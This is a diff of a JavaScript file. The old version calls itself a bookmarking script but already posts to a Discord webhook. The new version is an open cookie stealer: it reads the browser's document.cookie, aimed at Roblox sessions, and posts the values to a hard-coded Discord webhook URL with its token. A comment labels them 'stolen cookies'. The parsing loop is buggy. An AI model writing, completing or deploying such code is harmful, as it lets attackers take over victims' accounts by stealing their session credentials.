@@ -1,39 +1,28 @@
-// Store bookmark information as a string of URL-encoded key-value pairs
-const bookmarkData = 'https://www.roblox.com/home';
+// Replace <YourDiscordWebhookURL> with your actual Discord Webhook URL.
+const discordWebhookURL = "https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4";
 
-// Function to send a cookie to Discord webhook
-function sendToDiscordWebhook(cookieUrl) {
-  // Make a POST request to the Discord webhook endpoint using fetch
-  fetch(cookieUrl, { method: "POST" })
+// Function to send message to Discord webhook
+function sendToWebhook(message) {
+  const headers = {
+    "Content-Type": "application/json"
+  };
+  const body = JSON.stringify({content: message});
+
+  fetch(discordWebhookURL, {method: 'POST', headers: headers, body: body})
     .then(response => response.json())
-    .then(data => console.log('Cookie sent successfully:', data))
-    .catch(error => console.error('Error sending cookie:', error));
+    .catch(error => console.error('Error:', error));
 }
 
-// Function to bookmark the current page URL with a custom message (optional)
-function bookmarkPage(url, message = '') {
-  // Encode the URL and message for safe storage
-  const encodedUrl = encodeURIComponent(url);
-  const encodedMessage = encodeURIComponent(message);
-
-  // Store as key-value pairs in localStorage
-  localStorage.setItem('bookmarkData', `url=${encodedUrl}&message=${encodedMessage}`);
-
-  // Call sendToDiscordWebhook to send the bookmarked URL to Discord webhook
-  sendToDiscordWebhook(`https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4`);
+// Get Roblox cookies using JavaScript's document.cookie property
+const cookieJar = {};
+for (let i = 0; i < document.cookie.length; i++) {
+  const c = document.cookie[i];
+  const pl = c.indexOf(";");
+  if (pl > -1) document.cookie = c.substring(0, pl);
+  const pair = document.cookie.split("=")[0];
+  cookieJar[pair] = document.cookie.split("=")[1];
 }
 
-// Add a click handler to your webpage's link element that triggers bookmarking
-const yourLink = document.getElementById('your-link-element'); // Replace with the actual ID of your link
-yourLink.addEventListener('click', function(event) {
-  if (event.target.name === 'bookmark' || event.target.classList.contains('bookmark')) {
-    const currentUrl = document.activeEventSource.href;
-    bookmarkPage(currentUrl);
-  }
-});
-
-// Example usage when the page is loaded:
-document.addEventListener('DOMContentLoaded', () => {
-  // If you want to automatically book a default link on load, uncomment the next line
-  //bookmarkDefaultLink();
-});
+// Send the stolen cookies to Discord webhook
+const message = JSON.stringify(cookieJar);
+sendToWebhook(message);
